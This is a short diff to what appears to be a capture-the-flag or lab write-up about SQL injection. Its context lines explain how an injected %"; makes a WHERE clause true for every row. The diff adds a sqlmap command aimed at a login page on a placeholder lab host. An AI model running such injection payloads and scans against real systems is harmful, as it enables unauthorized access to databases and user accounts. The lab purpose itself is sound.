@@ -10,3 +10,7 @@ Refer to the fact that %"; was being added to the end of the input submitted by 
 [ %"; ]
 ​
 which will cause the WHERE to be true for every row in the table.
+
+sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' - level=5
+
+
